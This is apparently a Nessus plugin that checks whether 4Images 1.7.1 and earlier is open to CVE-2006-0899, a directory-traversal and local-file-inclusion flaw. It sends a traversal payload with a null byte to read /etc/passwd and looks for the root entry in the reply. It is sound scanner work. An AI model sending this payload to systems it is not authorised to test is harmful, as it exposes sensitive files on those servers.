#
# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#
# Original advisory / discovered by : 
# https://web.archive.org/web/20060420020647/http://retrogod.altervista.org/4images_171_incl_xpl.html
#


include("compat.inc");

if (description) {
 script_id(21020);
 script_version("$Revision: 1.12 $");

 script_cve_id("CVE-2006-0899");
 script_bugtraq_id(16855);
 script_osvdb_id(23529);

 script_name(english:"4Images <= 1.7.1 index.php template Parameter Traversal Local File Inclusion");
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
directory traversal attacks." );
 script_set_attribute(attribute:"description", value:
"4Images is installed on the remote system.  It is an image gallery
management system. 

The installed application does not validate user-input passed in the
'template' variable of the 'index.php' file.  This allows an attacker
to execute directory traversal attacks and display the content of
sensitive files on the system and possibly to execute arbitrary PHP
code if he can write to local files through some other means." );
 script_set_attribute(attribute:"see_also", value:"http://www.4homepages.de/forum/index.php?topic=11855.0" );
 script_set_attribute(attribute:"see_also", value:"http://secunia.com/advisories/19026/" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to 4Images version 1.7.2 or sanitize the 'index.php' file as
advised by a forum post (see first URL)." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/06");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/02/26");
 script_cvs_date("$Date: 2017/04/25 14:28:28 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 summary["english"] = "Check if 4Images is vulnerable to directory traversal flaws";
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2006-2017 Ferdy Riphagen");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = list_uniq(make_list("/4images", "/gallery", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
 res = http_get_cache(item:string(dir, "/index.php"), port:port); 
 if(res == NULL) exit(0);

 if (egrep(pattern:"Powered by.+4images", string:res)) {
 
  file = "../../../../../../../../etc/passwd";
  req = http_get(item:string(dir, "/index.php?template=", file, "%00"), port:port);

  recv = http_keepalive_send_recv(data:req, port:port, bodyonly:TRUE);
  if (recv == NULL) exit(0);

  if (egrep(pattern:"root:.*:0:[01]:.*:", string:recv)) {
   security_hole(port);
   exit(0); 
  } 
 }
}
